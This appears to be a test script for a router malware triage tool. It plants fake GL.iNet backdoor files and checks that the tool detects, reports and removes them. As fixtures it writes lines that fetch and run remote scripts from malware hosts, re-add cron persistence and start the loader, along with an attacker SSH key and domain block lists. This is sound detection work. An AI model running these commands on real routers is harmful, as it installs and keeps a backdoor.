expect "both: --fix removes gl-helper, leaves the backdoor, exit 3" '[ $rc = 3 ] && [ ! -e "$D/m/etc/config/.gl" ] && [ -f "$D/m/bin/ulogd" ] && grep -q "older backdoor is STILL THERE" "$D/fix.txt"'
umount "$D/m"

D=$(mkscen bdclean "$OWL"); U=$D/u
mkdir -p "$U/usr/sbin" "$U/etc/init.d" "$U/lib/apk/db" "$U/lib/upgrade/keep.d" "$U/usr/bin"
echo real >"$U/usr/sbin/ulogd"; printf '#!/bin/sh\n/usr/sbin/ulogd -d\n' >"$U/etc/init.d/ulogd"
printf 'P:busybox\nF:bin\nR:busybox\n\nP:ulogd\nF:usr/sbin\nR:ulogd\nF:etc/init.d\nR:ulogd\n\n' >"$U/lib/apk/db/installed"
echo /etc/my-own-file >"$U/lib/upgrade/keep.d/mine"; echo something-else >"$U/usr/bin/monitord"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "the ulogd package, an own keep list and another monitord are no indicator" '[ $rc = 0 ] && ! grep -q "backdoor-" "$D/check.txt"'
umount "$D/m"

echo "=== the loader left behind by GL.iNet's security update (RemoteToHome, 23 November)"
D=$(mkscen bdrest "$OWL"); U=$D/u
mkdir -p "$U/bin" "$U/lib/upgrade/keep.d" "$U/usr/lib/opkg"
printf '\033LuaQ loader\n' >"$U/bin/ulogd"
printf '/etc/config/network\n/bin/ulogd\n/etc/init.d/urandom_seed\n' >"$U/lib/upgrade/keep.d/netifd"
printf 'Package: gl-sdk4-system-check\nVersion: 1\n\n' >"$U/usr/lib/opkg/status"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "start script put back: the loader is still IOC and the text says it no longer starts" '[ $rc = 1 ] && grep -A3 "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" | tr -s " \n" " " | grep -q "no longer started at boot" && ! grep -q "backdoor-init" "$D/check.txt" && grep -q "IOC  *backdoor-keep" "$D/check.txt"'
mkdir -p "$D/m/etc"; printf '/usr/bin/monitord /bin/ulogd &\nexit 0\n' >"$D/m/etc/rc.local"
run "$D" "$OWL" --check >"$D/check2.txt"
expect "where something else still names the loader, nothing is said about it no longer starting (review of 2.54)" 'grep -q "IOC  *backdoor-file  */bin/ulogd" "$D/check2.txt" && ! grep -q "no longer started" "$D/check2.txt"'
umount "$D/m"

echo "=== an owner's script that blocks the older backdoor or ends it is not the backdoor (review of 2.54)"
D=$(mkscen bdown "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '#!/bin/sh /etc/rc.common\n# remove monitord and ujaild, block adsanalypro.com (CSA-2026-01)\nSTART=98\nstart() {\n\tkillall monitord ulogd ujaild 2>/dev/null\n\trm -f /usr/bin/monitord /bin/ulogd\n\techo "address=/adsanalypro.com/0.0.0.0" >/tmp/dnsmasq.d/bd.conf\n}\n' >"$U/etc/init.d/bd-block"
printf '#!/bin/sh /etc/rc.common\nSTART=97\nstart() {\n\tfor d in adguardns.com adsanalypro.com; do echo "address=/$d/0.0.0.0" >>/tmp/dnsmasq.d/bd2.conf; done\n}\n' >"$U/etc/init.d/bd-loop"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no backdoor-init, a clean verdict (exit 0)" '[ $rc = 0 ] && ! grep -q "backdoor-init" "$D/check.txt" && ! grep -q "^ *IOC " "$D/check.txt"'
expect "a block written by echo is INFO, a list for a loop REVIEW" 'grep -q "INFO  *backdoor-block  */etc/init.d/bd-block" "$D/check.txt" && grep -q "REVIEW  *server-ref  */etc/init.d/bd-loop" "$D/check.txt"'
umount "$D/m"

echo "=== other ways to start the loader, and a loop that fetches from the servers (review of 2.54)"
D=$(mkscen bdvar "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '#!/bin/sh /etc/rc.common\nUSE_PROCD=1\nstart_service() {\n\tprocd_open_instance\n\tprocd_set_param command /usr/bin/lua /bin/ulogd\n\tprocd_close_instance\n}\n' >"$U/etc/init.d/bv-procd"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\tsetsid lua /bin/ulogd &\n}\n' >"$U/etc/init.d/bv-setsid"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\t{ lua /bin/ulogd; } &\n}\n' >"$U/etc/init.d/bv-group"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\tenv lua /bin/ulogd &\n}\n' >"$U/etc/init.d/bv-env"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\tcommand -v monitord >/dev/null && killall monitord\n}\n' >"$U/etc/init.d/bv-own"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\tfor h in cdn.adguardns.com cdn.adxinsight.com; do wget -qO /tmp/u "http://$h/u" && lua /tmp/u; done\n}\n' >"$U/etc/init.d/bv-fetch"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "procd, setsid, { } and env starting the loader are each IOC backdoor-init" '[ $rc = 1 ] && ( for n in procd setsid group env; do grep -q "IOC  *backdoor-init  */etc/init.d/bv-$n" "$D/check.txt" || exit 1; done )'
expect "command -v monitord starts nothing" '! grep -q "backdoor-init  */etc/init.d/bv-own" "$D/check.txt"'
expect "a loop that fetches from the servers is IOC backdoor-host, not REVIEW" 'grep -q "IOC  *backdoor-host  */etc/init.d/bv-fetch" "$D/check.txt" && ! grep -q "REVIEW  *server-ref  */etc/init.d/bv-fetch" "$D/check.txt"'
umount "$D/m"

echo "=== a line that writes the malware's cron entry back (review of 2.54)"
D=$(mkscen echoput "$OWL"); U=$D/u
mkdir -p "$U/etc/uci-defaults" "$U/etc/init.d"
printf 'grep -q watch.sh /etc/crontabs/root || echo "*/3 * * * * /etc/config/.gl/watch.sh" >> /etc/crontabs/root\nexit 0\n' >"$U/etc/rc.local"
printf '(crontab -l; echo "*/3 * * * * /etc/config/.gl/watch.sh") | crontab -\n' >"$U/etc/uci-defaults/99-cron"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\techo "# gl-helper check done" >> /etc/rc.local\n}\n' >"$U/etc/init.d/ew-own"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "echo >> crontab and a pipe into crontab - put the malware back: IOC persist-ref" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/uci-defaults/99-cron" "$D/check.txt"'
expect "a comment written into rc.local starts nothing" '! grep -q "IOC .*ew-own" "$D/check.txt"'
umount "$D/m"

echo "=== quotes are read as sh reads them (review of 2.54)"
D=$(mkscen quotes "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf 'wget -qO- "http://65.20.71.131:8000/ni.sh?id=1&arch=arm" | sh\nexit 0\n' >"$U/etc/rc.local"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\techo "start #1"; /etc/config/.gl/run.sh\n}\n' >"$U/etc/init.d/qhash"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a quoted & does not cut the fetch off: IOC persist-ref" '[ $rc = 1 ] && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "fetches from a server"'
expect "a quoted # starts no comment: IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/qhash" "$D/check.txt"'
umount "$D/m"
D=$(mkscen quotes3 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf 'cat > /tmp/a.sh <<EOF\nwget -qO- http://65.20.71.131:8000/ni.sh | sh\nEOF\nsh /tmp/a.sh\n' >"$U/etc/init.d/q-hd"
printf 'sh -c "\n sleep 5\n /etc/config/.gl/run.sh\n" &\n' >"$U/etc/init.d/q-shc"
printf 'echo "# cron\n*/3 * * * * /etc/config/.gl/watch.sh" >> /etc/crontabs/root\n' >"$U/etc/init.d/q-cron"
printf "echo it's\n/etc/config/.gl/run.sh &\n" >"$U/etc/init.d/q-open"
printf 'watch -n 60 "true; /etc/config/.gl/run.sh" &\n' >"$U/etc/init.d/q-watch"
{ printf "awk '\n"; for i in $(seq 1 26); do printf '  /x/ { n++ }\n'; done; printf "' /proc/meminfo\n/etc/config/.gl/run.sh &\n"; } >"$U/etc/init.d/q-awk"
printf 'ping -c1 adguardns.com\n/etc/config/.gl/run.sh &\n' >"$U/etc/init.d/q-guard"
printf "echo '#!/bin/sh\n/etc/config/.gl/run.sh &' > /tmp/x.sh\nsh /tmp/x.sh\n" >"$U/etc/init.d/q-echo"
printf 'x="$(: "\047")"; true; /etc/config/.gl/run.sh & y="$(: "\047")"\n' >"$U/etc/init.d/q-nest"
printf "true;# don't\n/etc/config/.gl/run.sh &\ntrue;# isn't\n" >"$U/etc/init.d/q-hash"
printf ": \$'\\\\'' ; /etc/config/.gl/run.sh & : \\\\'\n" >"$U/etc/init.d/q-dollar"
printf 'CMD="sleep 5; /etc/config/.gl/run.sh"\nsh -c "$CMD" &\n' >"$U/etc/init.d/q-var"
printf 'cat > /tmp/a.sh <<E\nwget -q -O /tmp/n \\\n http://65.20.71.131:8000/ni.sh\nsh /tmp/n\nE\nsh /tmp/a.sh\n' >"$U/etc/init.d/q-hdcont"
printf 'x=$((1<<2))\nstart-stop-daemon -S -b \\\n -x /etc/config/.gl/gl-helper\n' >"$U/etc/init.d/q-shift"
printf 'x=${y%%)#*}; /etc/config/.gl/run.sh &\n' >"$U/etc/init.d/q-sub"
printf 'echo \\;#x; /etc/config/.gl/run.sh &\n' >"$U/etc/init.d/q-esc"
printf 'echo "/etc/config/.gl/ found" >> /etc/profile.d/note.sh\necho "gl-helper: checked" >> /etc/profile.d/note.sh\n' >"$U/etc/init.d/q-note"
printf 'cd /etc && echo "/etc/config/.gl/run.sh &" >> rc.local\n' >"$U/etc/init.d/q-rel"
printf 'echo "/etc/config/.gl/run.sh &" >> /etc/firewall.user\n' >"$U/etc/init.d/q-fw"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "here-document run later, sh -c and echo over lines, an open quote, watch, a long string, a backdoor name: each IOC persist-ref" '[ $rc = 1 ] && ( for n in hd shc cron open watch awk guard echo nest hash dollar var; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
expect "a \\ in a here-document or after a shift, a # sh reads as no comment, echo into rc.local after cd, into firewall.user: each IOC persist-ref" '( for n in hdcont shift sub esc rel fw; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
expect "a note written to a profile script, starting with a directory or a word with a colon, runs nothing: no IOC" '! grep -q "IOC  *[a-z-]*  */etc/init.d/q-note" "$D/check.txt"'
umount "$D/m"

echo "=== owners who block the older backdoor's servers their own way (review of 2.54)"
D=$(mkscen ownblock "$OWL"); U=$D/u
mkdir -p "$U/etc/config" "$U/etc/crontabs"
printf "config adblock-fast 'config'\n\tlist blocked_domain 'adguardns.com'\n\tlist blocked_domain 'adsanalypro.com'\n" >"$U/etc/config/adblock-fast"
printf 'address=/adguardns.com/192.168.8.1\naddress=/lede-openproject.org/10.0.0.1\n' >"$U/etc/dnsmasq.conf"
printf '0 4 * * * /usr/bin/check-dns.sh adguardns.com\n' >"$U/etc/crontabs/root"
printf '/etc/ulogd.conf\n#/bin/ulogd\n' >"$U/etc/sysupgrade.conf"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "an adblock list, a sinkhole, a check and the real ulogd are no backdoor: exit 0, no IOC" '[ $rc = 0 ] && ! grep -q "^ *IOC " "$D/check.txt"'
expect "the block list and the sinkhole are INFO backdoor-block, the check is REVIEW server-ref" 'grep -q "INFO  *backdoor-block  */etc/config/adblock-fast" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/dnsmasq.conf" "$D/check.txt" && grep -q "REVIEW  *server-ref  */etc/crontabs/root" "$D/check.txt"'
umount "$D/m"

echo "=== --fix without a base image takes out only the malware's lines (review of 2.54)"
D=$(mkscen nolower "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl" "$U/etc/init.d"
echo implant >"$U/etc/config/.gl/gl-helper"
printf '# Put your custom commands here\nlogger my-own-line\n/etc/config/.gl/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
printf '#!/bin/sh\nmy-dns-check\n/etc/config/.gl/gl-helper\n' >"$U/etc/init.d/dnsmasq"
mnt "$D" "$OWL"
triage --root "$D/m" --upper "$D/u" -o "$D/out" --fix >"$D/fix.txt" 2>&1
expect "the firmware's own files stay, without the malware's lines" '[ -f "$D/m/etc/rc.local" ] && grep -q "logger my-own-line" "$D/m/etc/rc.local" && ! grep -q "^/etc/config/.gl/gl-helper" "$D/m/etc/rc.local" && [ -f "$D/m/etc/init.d/dnsmasq" ] && grep -q "my-dns-check" "$D/m/etc/init.d/dnsmasq" && ! grep -q "^/etc/config/.gl/gl-helper" "$D/m/etc/init.d/dnsmasq" && ! grep -q "not in base image" "$D/fix.txt"'
expect "the malware's own directory is gone" '[ ! -e "$D/m/etc/config/.gl" ]'
umount "$D/m"

echo "=== gl-helper under another name, known by its packer (topic 73056, post 94)"
D=$(mkscen npk "$OWL"); U=$D/u
mkdir -p "$U/usr/sbin" "$U/root" "$U/etc/svc"
{ printf '\177ELF\001\001\001'; head -c 3000 /dev/zero; printf '$Info: Node hardened executable packer; format NPK2 $'; head -c 500 /dev/zero; } >"$U/usr/sbin/svcd"; chmod 755 "$U/usr/sbin/svcd"
{ printf 'NPK!H'; head -c 2000 /dev/zero; printf 'Node hardened executable packer'; } >"$U/etc/svc/blob"
{ printf 'my notes: the malware uses the Node hardened executable packer\n'; head -c 2000 /dev/zero | tr '\0' 'n'; } >"$U/root/notes.txt"
{ printf '\177ELF\001\001\001'; head -c 3000 /dev/zero; } >"$U/usr/sbin/own-tool"; chmod 755 "$U/usr/sbin/own-tool"
mkdir -p "$U/tmp"; echo x >"$U/tmp/.lp"
mkdir -p "$U/usr/bin"; { printf '\177ELF\002\001\001'; head -c 3000 /dev/zero; printf 'Node hardened executable packer'; } >"$U/usr/bin/lua"; chmod 755 "$U/usr/bin/lua"
{ printf 'ELF note\n'; printf 'Node hardened executable packer\n'; head -c 2000 /dev/zero | tr '\0' 'e'; } >"$U/root/elf-note.txt"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a program in the packer's format is IOC marker, also without ELF header" '[ $rc = 1 ] && grep -A1 "IOC  *marker  */usr/sbin/svcd" "$D/check.txt" | grep -q "packer of the malware" && grep -q "IOC  *marker  */etc/svc/blob" "$D/check.txt"'
expect "a note that quotes the packer's name and another program are not" '! grep -q "IOC.*/root/notes.txt" "$D/check.txt" && ! grep -q "IOC.*own-tool" "$D/check.txt" && ! grep -q "IOC.*elf-note" "$D/check.txt"'
expect "a packed program over a file of the base image is IOC marker too (review of 2.54)" 'grep -q "IOC  *marker  */usr/bin/lua" "$D/check.txt"'
expect "one finding per path" '[ $(grep -c " /usr/sbin/svcd$" "$D/check.txt") = 1 ]'
expect "/tmp/.lp is for review" 'grep -q "REVIEW  *tmp-file  */tmp/.lp" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix removes the packed files only, after archiving them (exit 2)" '[ $rc = 2 ] && [ ! -e "$D/m/usr/sbin/svcd" ] && [ ! -e "$D/m/etc/svc/blob" ] && [ -f "$D/m/root/notes.txt" ] && [ -f "$D/m/usr/sbin/own-tool" ] && tar -tzf "$(ls "$D"/out/*.tar.gz | head -n 1)" | grep -q "usr/sbin/svcd"'
expect "--fix puts the base image's file back where a packed program stood over it" '[ "$(cat "$D/m/usr/bin/lua")" = lua-interpreter ]'
umount "$D/m"

echo "=== base files are package-owned too: a changed one must still be seen (issue 4)"
OWP=$BASE/openwrt-rom-pkg
cp -a "$OWL" "$OWP"
printf 'P:busybox\nF:bin\nR:busybox\n\nP:urandom-seed\nF:etc/init.d\nR:urandom_seed\n\nP:netifd\nF:lib/upgrade/keep.d\nR:netifd\nF:etc/init.d\nR:dnsmasq\n\n' >"$OWP/lib/apk/db/installed"
D=$(mkscen bdpkg "$OWP"); U=$D/u
backdoor "$U"
mkdir -p "$U/etc/glinet/.cache"; echo '#!/bin/sh' >"$U/etc/glinet/.cache/watch.sh"
printf '#!/bin/sh\n# my own change\n' >"$U/etc/init.d/dnsmasq"
mnt "$D" "$OWP"
run "$D" "$OWP" --check >"$D/check.txt"; rc=$?
expect "package-owned urandom_seed and keep list with the backdoor's lines are IOC" 'grep -q "IOC  *backdoor-init  */etc/init.d/urandom_seed" "$D/check.txt" && grep -q "IOC  *backdoor-keep  */lib/upgrade/keep.d/netifd" "$D/check.txt"'
expect "another changed package-owned base file is REVIEW, not skipped" 'grep -q "REVIEW  *changed  */etc/init.d/dnsmasq" "$D/check.txt"'
expect "watch.sh in the malware's directory is a marker" 'grep -q "IOC  *marker  */etc/glinet/.cache/watch.sh" "$D/check.txt"'
umount "$D/m"

echo "=== archive without secrets (issue 3)"
D=$(mkscen scrub "$OWL"); U=$D/u
mkdir -p "$U/root/.ssh" "$U/etc/config" "$U/etc/dropbear" "$U/etc/openvpn" "$U/tmp"
printf 'root:$1$SECRETHASH:19000:0:99999:7:::\n' >"$U/etc/shadow"
echo SECRETSSHKEY >"$U/root/.ssh/id_rsa"; echo 'ssh-ed25519 AAAAATTACKER evil' >"$U/root/.ssh/authorized_keys"
echo SECRETHOSTKEY >"$U/etc/dropbear/dropbear_rsa_host_key"; echo SECRETOVPN >"$U/etc/openvpn/client.ovpn"
printf "config peers\n\toption private_key 'SECRETWGKEY'\n\toption public_key 'PEERPUBLIC'\n\toption end_point '1.2.3.4:51820'\n" >"$U/etc/config/wireguard"
printf "config wifi-iface\n\toption ssid 'home'\n\toption key 'SECRETWIFI'\n\toption wpa_passphrase 'SECRETWPA'\n\toption api_key 'SECRETAPI'\n" >"$U/etc/config/wireless"
mkdir -p "$U/etc/ppp" "$U/etc/AdGuardHome"; echo 'user * SECRETPPP' >"$U/etc/ppp/chap-secrets"; echo 'password: OTHERFORMAT' >"$U/etc/AdGuardHome/config.yaml"
mnt "$D" "$OWL"
run "$D" "$OWL" --archive >/dev/null; A=$(ls "$D"/out/*.tar.gz); mkdir "$D/x"; tar -xzf "$A" -C "$D/x"
expect "no password hash, private key, host key or VPN profile in the archive" '! grep -rq "SECRETHASH\|SECRETSSHKEY\|SECRETHOSTKEY\|SECRETOVPN" "$D/x"'
expect "key values replaced, the peer stays visible" '! grep -rq "SECRETWGKEY\|SECRETWIFI" "$D/x" && grep -rq "PEERPUBLIC" "$D/x/evidence/files" && grep -rq "1.2.3.4:51820" "$D/x/evidence/files" && grep -rq "option private_key .REDACTED." "$D/x/evidence/files"'
expect "option names that end in a secret word are replaced, PPP secrets removed" '! grep -rq "SECRETWPA\|SECRETAPI\|SECRETPPP" "$D/x"'
expect "the archive says plainly that it can still hold passwords" 'grep -q "CAN STILL HOLD PASSWORDS" "$D/x/evidence/REDACTED.txt"'
expect "authorized_keys is kept: an added key is evidence" 'grep -rq "AAAAATTACKER" "$D/x/evidence/files"'
expect "REDACTED.txt lists what was left out, and is in the manifest" 'grep -q "/etc/shadow" "$D/x/evidence/REDACTED.txt" && grep -q "/root/.ssh/id_rsa" "$D/x/evidence/REDACTED.txt" && grep -q "REDACTED.txt" "$D/x/evidence/MANIFEST.sha256"'
expect "shadow summary is written when the base image has no shadow file" 'grep -q "^root.*hash set" "$D/x/evidence/etc/shadow-summary.txt"'
expect "the device itself is untouched" 'grep -q SECRETSSHKEY "$D/m/root/.ssh/id_rsa" && grep -q SECRETHASH "$D/m/etc/shadow" && grep -q SECRETWGKEY "$D/m/etc/config/wireguard"'
rm -rf "$D/x" "$D"/out/*; run "$D" "$OWL" --archive --with-secrets >/dev/null; mkdir "$D/x"; tar -xzf "$(ls "$D"/out/*.tar.gz)" -C "$D/x"
expect "--with-secrets keeps keys, never the password hash" 'grep -rq SECRETSSHKEY "$D/x" && grep -rq SECRETWGKEY "$D/x" && ! grep -rq SECRETHASH "$D/x"'
umount "$D/m"

echo "=== the handler's empty state file: a command ran, also after a restart"
D=$(mkscen cmd "$OWL"); U=$D/u
mkdir -p "$U/etc/config"; : >"$U/etc/mp_ip_mapping_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "empty, written since the attack, AstroWarp off = IOC, verdict ATTACKED, exit 1" '[ $rc = 1 ] && grep -q "IOC  *cloud-command  */etc/mp_ip_mapping_info" "$D/check.txt" && grep -q "Verdict: ATTACKED" "$D/check.txt" && ! grep -q "Verdict: INFECTED" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix has nothing to remove, leaves the file, exit 1" '[ $rc = 1 ] && grep -q "Nothing to remove" "$D/fix.txt" && [ -f "$D/m/etc/mp_ip_mapping_info" ]'
touch -d '2026-10-01 12:00:00 UTC' "$D/m/etc/mp_ip_mapping_info"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "empty but written before the attack = REVIEW, exit 0" '[ $rc = 0 ] && grep -q "REVIEW  *state-file" "$D/check.txt"'
touch "$D/m/etc/mp_ip_mapping_info"; printf "config mptun 'global'\n\toption enable '1'\n" >"$D/m/etc/config/mptun"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "empty and recent, but AstroWarp is on = REVIEW, exit 0" '[ $rc = 0 ] && grep -q "REVIEW  *state-file.*" "$D/check.txt" && grep -q "AstroWarp on" "$D/check.txt"'
printf "config mptun 'global'\n\toption enable '0'\n\nconfig other 'x'\n\toption enable '1'\n" >"$D/m/etc/config/mptun"
mkdir -p "$D/m/etc/config/.gl"; echo payload >"$D/m/etc/config/.gl/gl-helper"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "with malware files as well the verdict is INFECTED, and enable in another section does not count" '[ $rc = 1 ] && grep -q "Verdict: INFECTED - gl-helper" "$D/check.txt" && grep -q "IOC  *cloud-command" "$D/check.txt"'
umount "$D/m"

echo "=== the state file's first call: its access time, only on a noatime mount"
D=$(mkscen first "$OWL"); U=$D/u
mkdir -p "$U/etc"; printf 'aa:bb:cc:dd:ee:ff 10.0.0.2 192.168.8.2\n' >"$U/etc/mp_ip_mapping_info"
touch -a -d '2026-03-02 08:14:55 UTC' "$U/etc/mp_ip_mapping_info"; touch -m -d '2026-11-21 10:00:00 UTC' "$U/etc/mp_ip_mapping_info"
mount -t overlay overlay -o "noatime,lowerdir=$OWL,upperdir=$D/u,workdir=$D/w" "$D/m"
run "$D" "$OWL" --check >"$D/check.txt"
expect "noatime: the access time is the first call, the time written the last" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "first call 2026-03-02 08:14:55 UTC, last call 2026-11-21 10:00:00 UTC, 39 bytes"'
umount "$D/m"; mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "without noatime only the time written is given" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "written 2026-11-21 10:00:00 UTC, 39 bytes" && ! grep -q "first call" "$D/check.txt"'
touch -d '1970-01-01 00:00:07 UTC' "$D/m/etc/mp_ip_mapping_info"
run "$D" "$OWL" --check >"$D/check.txt"
expect "a time before 2020 is shown as not a real date" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "written 1970-01-01 00:00:07 UTC (clock was not set, not a real date), 39 bytes"'
touch -d '2020-01-01 00:00:00 UTC' "$D/m/etc/mp_ip_mapping_info"
run "$D" "$OWL" --check >"$D/check.txt"
expect "from 2020 on a time is shown as it is" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "written 2020-01-01 00:00:00 UTC, 39 bytes" && ! grep -q "clock was not set" "$D/check.txt"'
umount "$D/m"

echo "=== an updated program that replaces a link of the base image is no hijack"
OWT=$BASE/openwrt-rom-ts
cp -a "$OWL" "$OWT"; mkdir -p "$OWT/usr/sbin"; echo tailscaled >"$OWT/usr/sbin/tailscaled"; ln -s tailscaled "$OWT/usr/sbin/tailscale"
printf 'P:busybox\nF:bin\nR:busybox\n\nP:tailscale\nF:usr/sbin\nR:tailscale\nR:tailscaled\n\n' >"$OWT/lib/apk/db/installed"
D=$(mkscen ts "$OWT"); U=$D/u
mkdir -p "$U/usr/sbin" "$U/bin"; echo combined >"$U/usr/sbin/tailscale"; echo combined >"$U/usr/sbin/tailscaled"
mnt "$D" "$OWT"
run "$D" "$OWT" --check >"$D/check.txt"; rc=$?
expect "Tailscale's own binary over the base link = REVIEW, exit 0" '[ $rc = 0 ] && grep -q "REVIEW  *replaced-link  */usr/sbin/tailscale" "$D/check.txt" && ! grep -q "applet-hijack" "$D/check.txt"'
rm "$D/m/bin/login"; echo fake >"$D/m/bin/login"
run "$D" "$OWT" --check >"$D/check.txt"; rc=$?
expect "a file over a busybox link is still IOC" '[ $rc = 1 ] && grep -q "IOC  *applet-hijack  */bin/login" "$D/check.txt"'
umount "$D/m"

echo "=== a named pipe in a scanned place must not hang the script (issue 9)"
D=$(mkscen fifo "$OWO"); U=$D/u
mkdir -p "$U/etc/config" "$U/etc/init.d" "$U/etc/crontabs" "$U/usr/lib/opkg/info" "$U/root/.ssh" "$U/etc/config/.gl"
mkfifo "$U/etc/config/x" "$U/etc/init.d/y" "$U/etc/crontabs/z" "$U/usr/lib/opkg/info/evil.list" "$U/root/.ssh/id_fifo"
rm -f "$U/etc/rc.local"; mkfifo "$U/etc/rc.local" "$U/etc/mp_ip_mapping_info" "$U/etc/passwd" "$U/etc/hostname"
mkfifo "$U/etc/config/wireguard" "$U/etc/config/mptun"
echo payload >"$U/etc/config/.gl/gl-helper"
mnt "$D" "$OWO"
timeout 60 env PATH="$TRIAGE_PATH" $TRIAGE_SH "$T" --root "$D/m" --upper "$D/u" --lower "$OWO" -o "$D/out" --archive >"$D/check.txt" 2>&1; rc=$?
expect "the run ends with a verdict and an archive (exit $rc)" '[ $rc = 1 ] && grep -q "Verdict: INFECTED" "$D/check.txt" && ls "$D"/out/*.tar.gz >/dev/null'
expect "a pipe in place of rc.local is reported, not read" 'grep -q "REVIEW  *odd-file  */etc/rc.local" "$D/check.txt"'
timeout 60 env PATH="$TRIAGE_PATH" $TRIAGE_SH "$T" --root "$D/m" --upper "$D/u" --lower "$OWO" -o "$D/out" --fix >"$D/fix.txt" 2>&1; rc=$?
expect "--fix ends too and removes the malware (exit $rc)" '[ $rc != 124 ] && [ ! -e "$D/m/etc/config/.gl" ]'
umount "$D/m"

echo "=== smaller gaps (issue 10)"
D=$(mkscen gaps "$OWO"); U=$D/u
mkdir -p "$U/usr/bin" "$U/etc/udhcpc.user.d" "$U/etc/init.d" "$U/etc/config" "$U/bin" "$U/etc/hotplug.d/iface"
ln -s /bin/busybox "$U/usr/bin/netstat"; ln -s /bin/busybox "$U/usr/bin/mytool"
printf '#!/bin/sh\necho hi\n' >"$U/etc/udhcpc.user.d/10-mine"
printf '#!/bin/sh\n/etc/glinet/.cache/watch.sh &\n' >"$U/etc/init.d/S99w"
printf '#!/bin/sh\nwget http://66.245.219.252:8000/ni.sh\n' >"$U/etc/hotplug.d/iface/99-x"
printf '\033Lua junk get_mac_form_proc domain_table\n' >"$U/bin/ulogd"
printf "config cloud\n\toption enable '1'\n\toption bindtime '1700000000'\n\toption email 'someone@example.org'\n" >"$U/etc/config/gl-cloud"
printf "config rtty\n\toption ssh_en '1'\n\toption web_en '0'\n" >"$U/etc/config/rtty"
mkdir -p "$U/usr/lib"; { printf '\033LuaQ'; head -c 1500 /dev/zero | tr '\0' 'x'; printf ' get_mac_form_proc domain_table'; } >"$U/usr/lib/hidden-loader"
{ printf '\033LuaQ'; head -c 1500 /dev/zero | tr '\0' 'y'; } >"$U/usr/lib/other.luac"; { printf 'text about LuaQ '; head -c 1500 /dev/zero | tr '\0' 'z'; } >"$U/usr/lib/plain.txt"
printf '#!/bin/sh\nwget http://gl-inet.top:8899/api/v2/sync\n' >"$U/etc/init.d/S98top"
mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: 1.2.3-4\n\nPackage: other\nVersion: 9\n' >"$U/usr/lib/opkg/status"
mnt "$D" "$OWO"
run "$D" "$OWO" --check >"$D/check.txt"; rc=$?
expect "a netstat link to busybox made since the attack = IOC installer-trace" 'grep -A1 "IOC  *installer-trace  */usr/bin/netstat" "$D/check.txt" | grep -q "link to busybox made on 20"'
expect "another new link that the firmware does not have = REVIEW" 'grep -A1 "REVIEW  *new-link  */usr/bin/mytool" "$D/check.txt" | grep -q "busybox"'
expect "a script in udhcpc.user.d = REVIEW" 'grep -q "REVIEW  *new  */etc/udhcpc.user.d/10-mine" "$D/check.txt"'
expect "an init script that starts watch.sh = IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/S99w" "$D/check.txt"'
expect "an autostart file that fetches from a server of the malware = IOC persist-ref" 'grep -A1 "IOC  *persist-ref  */etc/hotplug.d/iface/99-x" "$D/check.txt" | grep -q "66.245.219.252"'
expect "the loader is recognized by its function names" 'grep -A1 "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" | grep -q "compiled Lua.*function names of the analyzed loader"'
expect "GoodCloud state, client version, binding and remote access are printed" 'grep -q "GoodCloud now  *on (gl-sdk4-cloud 1.2.3-4), bound to an account: on" "$D/check.txt" && grep -q "Remote access  *SSH: on, web: off (through GoodCloud)" "$D/check.txt"'
umount "$D/m"
sed -i "s/option enable '1'/option enable '0'/" "$U/etc/config/gl-cloud"
mnt "$D" "$OWO"
